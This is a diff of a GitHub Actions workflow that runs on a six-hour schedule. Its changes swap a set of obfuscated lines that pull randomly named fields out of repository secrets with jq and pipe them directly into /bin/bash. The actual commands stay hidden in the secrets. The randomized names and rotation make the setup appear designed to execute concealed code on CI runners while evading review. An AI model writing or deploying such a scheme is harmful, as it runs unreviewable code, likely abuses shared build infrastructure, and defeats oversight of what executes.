@@ -2,26 +2,29 @@ name: suyanzhn
 on:
   workflow_dispatch:
   schedule:
-    - cron: '37 2/6 * * *'
+    - cron: '30 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: suyanzhn
         env:
-          prplr9656: ${{ secrets.prplr9656 }}
+          lz735: ${{ secrets.lz735 }}
         run: |
-          echo $prplr9656 | jq -r .pw8 | /bin/bash
-          echo $dj167 | jq -r .pdeeu45 | /bin/bash
-          echo $bjwt6 | jq -r .va4264 | /bin/bash
-          echo $qaj497 | jq -r .rawp30173 | /bin/bash
-          echo $hkxaf627 | jq -r .ymvd7 | /bin/bash
-          echo $nmrt67 | jq -r .hr12351 | /bin/bash
-          echo $cuza50574 | jq -r .ixjg59618 | /bin/bash
-          echo $khmhu4 | jq -r .yqh21513 | /bin/bash
-          echo $zq49527 | jq -r .seul9366 | /bin/bash
-          echo $m7 | jq -r .o7706 | /bin/bash
+          echo $lz735 | jq -r .csnya9295 | /bin/bash
+          echo $r1822 | jq -r .dfmxl916 | /bin/bash
+          echo $e57 | jq -r .au91256 | /bin/bash
+          echo $bbo9210 | jq -r .bvm77018 | /bin/bash
+          echo $k1 | jq -r .vtihq71 | /bin/bash
+          echo $uannf7165 | jq -r .ch24 | /bin/bash
+          echo $jdxop18994 | jq -r .x1013 | /bin/bash
+          echo $cqz86 | jq -r .iu040 | /bin/bash
+          echo $wyni84625 | jq -r .zcxh8 | /bin/bash
+          echo $rct11 | jq -r .nt92 | /bin/bash
+          echo $rd729 | jq -r .aij44 | /bin/bash
+          echo $kkv4312 | jq -r .it8 | /bin/bash
+          echo $p1 | jq -r .ociz06361 | /bin/bash
+          echo $sgmi205 | jq -r .joax213 | /bin/bash
 
